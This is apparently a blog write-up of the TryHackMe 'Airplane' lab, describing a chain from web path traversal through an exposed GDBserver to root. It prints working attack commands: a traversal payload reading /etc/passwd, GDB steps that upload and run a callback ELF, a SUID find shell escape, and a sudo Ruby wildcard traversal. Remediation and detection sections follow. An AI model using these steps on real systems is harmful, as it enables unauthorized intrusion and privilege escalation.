---
title: "TryHackMe: Airplane"
date: 2026-01-18 23:45:00 +0100
categories: [TryHackMe]
tags:
  - linux
  - web
  - lfi
  - path-traversal
  - procfs
  - gdbserver
  - suid
  - find
  - sudo
  - ruby
  - privilege-escalation
description: >-
  Airplane chains local file inclusion, procfs service discovery, exposed
  GDBserver execution, SUID find abuse, and a sudo Ruby wildcard path traversal
  into complete root compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_airplane
image:
  path: room_image.webp
  alt: "Original TryHackMe Airplane room artwork"
toc: true
comments: false
---

Airplane is a Linux web-to-root challenge built around file disclosure, exposed debugging infrastructure, SUID misuse, and unsafe sudo wildcarding. The validated path used a vulnerable `page` parameter to inspect local files and `/proc`, identified GDBserver on TCP/6048, obtained a shell as `hudson`, moved to `carlos` through a SUID `find` binary, and finally abused a sudo Ruby wildcard with path traversal to reach root.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Airplane room card](room_card.webp){: w="303" h="272" .shadow }](https://tryhackme.com/room/airplane){: .center }

## Executive Summary

The target exposed three relevant services:

```text
22/tcp    SSH
6048/tcp  GDBserver
8000/tcp  HTTP / Werkzeug
```

The validated compromise path was:

1. enumerate TCP services;
2. identify the Flask/Werkzeug application on TCP/8000;
3. confirm path traversal/local file inclusion through the `page` parameter;
4. read `/etc/passwd` and identify local users `hudson` and `carlos`;
5. inspect `/proc` through the same file-disclosure primitive;
6. map the unknown TCP/6048 service to a GDBserver process owned by `hudson`;
7. connect to the exposed GDBserver;
8. upload and execute a controlled ELF payload;
9. obtain an interactive shell as `hudson`;
10. identify `/usr/bin/find` with the SUID bit set and owned by `carlos`;
11. abuse SUID `find -exec` to obtain an effective `carlos` shell;
12. retrieve the user objective;
13. enumerate sudo rights for `carlos`;
14. identify `(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb`;
15. use path traversal through the wildcard to execute an attacker-controlled Ruby script outside `/root`;
16. obtain a root shell;
17. retrieve the final root objective.

> **Result:** An unauthenticated web user was able to progress to full root compromise through LFI, exposed GDBserver, SUID misuse, and unsafe sudo wildcarding.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Airplane laboratory target.

Testing was limited to the assigned host and challenge objectives. Target and attacker addressing, challenge proof values, and operator-specific SSH keys are redacted from the public version.

## Initial Enumeration

Representative service discovery:

```console
$ nmap \
  -p22,6048,8000 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed services:

```text
22/tcp    SSH       OpenSSH
6048/tcp  GDBserver
8000/tcp  HTTP      Werkzeug / Python
```

The web service redirected to:

```text
http://airplane.thm:8000/?page=index.html
```

## Local File Inclusion / Path Traversal

The application used a `page` query parameter to select content.

A traversal payload could escape the intended static directory and read system files:

```console
$ curl -s \
  'http://airplane.thm:8000/?page=../../../../../../etc/passwd'
```

Relevant local users included:

```text
hudson
carlos
```

This confirmed a file-disclosure vulnerability sufficient to inspect both operating-system files and procfs data.

## Application Source Review

The vulnerable request handling was effectively:

```python
page = 'static/' + request.args.get('page')

if os.path.isfile(page):
    return send_file(page)
```

Because attacker-controlled input was concatenated into a filesystem path without canonicalization and boundary enforcement, traversal sequences could escape the intended static directory.

The application itself ran as:

```text
hudson
```

## procfs Enumeration

The LFI primitive also exposed `/proc`.

Useful targets included:

```text
/proc/self/cmdline
/proc/self/cwd/app.py
/proc/net/tcp
/proc/<PID>/cmdline
```

`/proc/net/tcp` showed an additional listening socket corresponding to TCP/6048.

Iterating readable process command lines identified the service as:

```text
/usr/bin/gdbserver ALL_INTERFACES:6048 airplane
```

The process ran under the `hudson` account.

## Exposed GDBserver

The GDBserver accepted unauthenticated remote debugging connections.

The validated approach was:

1. generate a controlled Linux ELF callback payload;
2. connect with GDB to `airplane.thm:6048`;
3. upload the ELF into `/tmp`;
4. change the remote executable;
5. run the uploaded payload.

Representative GDB workflow:

```text
target extended-remote airplane.thm:6048
remote put PAYLOAD.elf /tmp/PAYLOAD.elf
set remote exec-file /tmp/PAYLOAD.elf
run
```

The resulting shell identity was:

```text
uid=1001(hudson)
```

This established the initial host shell.

## SUID find Escalation to carlos

Local SUID enumeration identified:

```text
/usr/bin/find
```

The file was owned by:

```text
carlos
```

and had the SUID bit enabled.

The standard `find -exec` behavior could therefore launch a shell retaining the effective SUID identity:

```console
$ /usr/bin/find . \
  -exec /bin/sh -p \; \
  -quit
```

The resulting context showed:

```text
euid=1000(carlos)
```

This provided the privilege boundary required to access the `carlos` user context.

The user objective is published only as:

```text
THM{[REDACTED]}
```

## Sudo Ruby Wildcard

Sudo enumeration as `carlos` showed:

```text
(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

The rule appeared to constrain Ruby execution to scripts under `/root`, but the wildcard accepted path-traversal sequences between `/root/` and the `.rb` suffix.

This meant an attacker-controlled Ruby file outside `/root` could still match the sudo command.

## Root Escalation Through Path Traversal

A controlled Ruby script was created outside `/root`:

```ruby
exec "/bin/sh"
```

The wildcard rule was then bypassed with a traversal path:

```console
$ sudo /usr/bin/ruby \
  /root/../tmp/root.rb
```

The resulting identity was:

```text
uid=0(root)
gid=0(root)
```

The final objective was located at:

```text
/root/root.txt
```

and is redacted:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - Local File Inclusion / Path Traversal

- **Severity:** High
- **Affected service:** HTTP on TCP/8000
- **Affected parameter:** `page`
- **Impact:** arbitrary local file disclosure

The application concatenated untrusted input into a filesystem path and returned local files without enforcing a safe base directory.

**Remediation:**

- never concatenate untrusted input into filesystem paths;
- use an allow-list of known page identifiers;
- resolve and canonicalize requested paths;
- verify the final path remains inside the intended content directory;
- deny access to `/proc`, `/etc`, home directories, and other sensitive paths.

### F-02 - Unauthenticated GDBserver Exposed

- **Severity:** Critical
- **Affected service:** GDBserver on TCP/6048
- **Impact:** remote code execution as `hudson`

The remote debugging service accepted unauthenticated connections and permitted binary upload/execution.

**Remediation:**

- do not expose GDBserver to untrusted networks;
- bind it to localhost or an isolated management interface;
- use host firewalling and VPN-only access;
- remove debugging services from production systems;
- monitor unexpected remote-debugger traffic.

### F-03 - SUID Misconfiguration on find

- **Severity:** High
- **Affected binary:** `/usr/bin/find`
- **Owner:** `carlos`
- **Impact:** privilege escalation from `hudson` to `carlos`

A general-purpose command-execution utility carried the SUID bit.

**Remediation:**

- remove SUID from `find`;
- regularly inventory SUID/SGID binaries;
- restrict privileged execution to purpose-built tools;
- alert on unexpected permission changes to system utilities.

### F-04 - Unsafe sudo Ruby Wildcard

- **Severity:** Critical
- **Affected account:** `carlos`
- **Rule:** `(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb`
- **Impact:** arbitrary root code execution

The sudo rule used a wildcard in a path context where `../` traversal remained valid.

**Remediation:**

- never rely on sudo path wildcards for interpreter scripts;
- grant access only to exact immutable script paths;
- avoid passwordless interpreter execution;
- use root-owned wrappers with fixed actions and strict argument validation.

## Security Impact

The validated chain resulted in complete root compromise from an unauthenticated remote starting position.

An attacker with equivalent access could:

- read arbitrary local files through the web application;
- discover internal process and service details through `/proc`;
- execute code through exposed debugging infrastructure;
- escalate between local users through unsafe SUID binaries;
- bypass sudo path restrictions;
- execute arbitrary code as root;
- access or modify all local data and system configuration.

## Detection Opportunities

Useful monitoring controls include:

- alert on traversal patterns such as `../` in the `page` parameter;
- monitor application reads of `/etc` and `/proc`;
- detect external connections to TCP/6048;
- alert on GDBserver file uploads and remote executable changes;
- monitor execution of SUID `/usr/bin/find`;
- detect `find -exec` spawning shells;
- alert on sudo Ruby invocations containing `../`;
- monitor root shells launched by interpreters.

## Remediation Priorities

1. Fix the `page` path traversal/LFI.
2. Remove or firewall GDBserver.
3. Remove SUID from `/usr/bin/find`.
4. Replace the sudo Ruby wildcard rule with exact immutable paths.
5. Rotate any secrets or keys accessible after compromise.
6. Add procfs/file-access monitoring for the web service.
7. Audit all SUID binaries and sudoers wildcards.
8. Separate debugging infrastructure from the production trust boundary.

## Retest Plan

1. Confirm traversal payloads cannot read `/etc/passwd`.
2. Verify `/proc` cannot be accessed through the web `page` parameter.
3. Confirm TCP/6048 is closed, filtered, or restricted to an approved management network.
4. Verify unauthenticated GDB clients cannot upload or execute binaries.
5. Confirm `/usr/bin/find` no longer carries an unsafe SUID bit.
6. Verify the previous SUID `find` technique no longer yields `carlos`.
7. Confirm sudo requires an exact trusted Ruby script path.
8. Verify `/root/../tmp/*.rb` style traversal no longer matches the rule.
9. Confirm the previous attack chain no longer reaches root.

## Lessons Learned

Airplane demonstrates how an information-disclosure flaw can become the starting point for a full host compromise.

File traversal exposed procfs, procfs revealed a remote debugger, GDBserver yielded the initial shell, a SUID utility crossed the next user boundary, and a wildcard sudo rule finally collapsed the root boundary.

The strongest defensive response is to treat path handling, debugging services, SUID binaries, and sudo interpreter rules as one connected privilege chain.
